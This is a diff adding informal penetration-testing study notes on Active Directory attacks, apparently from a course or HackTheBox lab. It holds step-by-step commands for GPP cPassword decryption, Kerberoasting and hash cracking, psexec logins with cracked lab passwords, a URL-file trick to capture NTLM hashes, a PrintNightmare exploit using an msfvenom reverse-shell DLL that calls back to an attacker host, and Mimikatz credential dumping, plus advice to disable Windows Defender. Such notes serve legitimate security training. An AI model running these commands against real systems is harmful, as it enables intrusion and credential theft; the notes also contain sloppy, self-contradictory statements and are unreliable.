@@ -134,5 +134,153 @@ step 2: $Hashcat -m 13100 kerberoast.txt rockyou.txt
 *Strong Password
 *Least Privilege
 
------------------------------------------------
+-----------------------------------------------GPP / cPassword Attacks Overview-----------------------------------------------------------
+Group policy preferences (MS14-025)
+
+*GPP allows admins to create policies using embedded credentials
+*These credentials were encrypted and placed in a cPassword , the key was accidentally released.Patched in MS14-025.
+But doesn't prevent previous uses.
+
+https://www.rapid7.com/blog/post/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage/
+
+-------------------------------------------ABUSING GPP -1 --------------------------------------------------------------
+HACKTHEBOX MACHINE - ACTIVE
+
+$nmap -T5 10.10.10.100
+$smbclient -L \\\\10.10.10.100\\
+$smbclient -L \\\\10.10.10.100\\REPLICATION
+
+smb>promt off
+smb>recurse on
+smb>mget *
+
+When comes to GPP look for xml file (GROUP.XML)
+powershell for GPP , INVOKEGPP
+
+Copy the cpassword 
+$gpp-decrypt ()
+
+found the encrypt password
+
+----------------------------------------------ABUSING GPP -2 --------------------------------------------------------
+
+$psexec.py active.htb/svc_tgs:GPPstillStandStrong2k18@10.10.10.100
+(nothing is writable)
+
+$GetUserSPNs.py active.htb/svc_tgs:GPPstillStandStrong2k18@10.10.10.100 -dc -ip 10.10.10.100 -request
+2.$Hashcat.exe -m 13100 hash.txt rockyou.txt -o
+
+found pass - Ticketmaster1968
+
+$psexec.py active.htb/Admin:Ticketmaster1968@10.10.10.100
+
+got the shell
+
+$whoami
+
+--------------------------------------------------URL FILE ATTACK-----------------------------------------------------
+
+you compromised a user and this user has any sort od share access.
+try to expolit.
+
+SCF ATTACK NOT GOOD HAS FILE URL ATTACK
+
+in Notepad:
+[InternetShortcut]
+URL=blah
+WorkingDirectory=blah
+Iconfile=\\192.168.138.128\%USERNAME%.icon
+IconIndex=1
+
+
+$responder -I eth0 -v
+
+got the hash of NTLM2 
+
+------------------------------------------------PrintNightmare cve-2021-1675---------------------------------------------------------
+
+post-authentication attack - no authentication needed
+
+printnightmare attack taking advantage of the printer spooler
+
+*Cube0x0/cve-2021-1675
+
+step- 1: to know vulnerable or not
+
+$rpcdump.py @192.168.1.10 | egrep 'MS-RPRN|MS-PAR'
+
+Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
+Protocol: [MS-RPRN]: Print System Remote Protocol
+
+step-2:
+$pip3 uninstall impacket
+$git clone https://github.com/cube0x0/impacket
+$cd impacket
+$python3 ./setup.py install
+
+$gedit cve-2021-1675.py
+
+$msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.138.128 LPORT=5555 -F dll > shell.dll
+
+when u used msfvenom , use msfconsole also.
+
+$msfconsole
+$use multi/handler
+$options
+$set payload windows/x64/meterpreter/reverse_tcp
+$option
+$set lport and lhosts
+
+
+$smbserver.py share 'pwd' -mb2support
+
+$python3 cve-2021-1675.py marvel.local/fcastle:password1@192.168.138.132 '\\192.168.138.128\share\shell.dll
+
+turn off the windows defender 
+
+it will work fine.
+
+----------------------------------------------------Mimikatz Overview------------------------------------------------
+
+*used to steal and view credentials
+*Dumps credentials stored
+*credential dumping,passthehack,overpassthehash,passtheticket,goldenticket,silverticket
+
+goto github page:gentikiwi/mimikatz
+
+--------------------------------------------------CREDENTIAL DUMPING WITH MIMIKATZ-----------------------------------
+
+1.Download the mimkatz zip file and extract it
+
+wiki is a place to learn about mimikatz 
+
+in domain controller:
+
+$cd Downloads
+$mimikatz.exe
+#privilege::debug
+
+dump some info out of memory
+
+#sekurlsa::logonpasswords
+
+u will find NTLM hash
+
+#lsadump::sam
+#lsadump::lsa /patch  (patch is important)
+
+Set good password policy
+
+--------------------------------------------GOLDEN ticket Attacks---------------------------
+
+
+
+
+
+
+
+
+
+
+
 
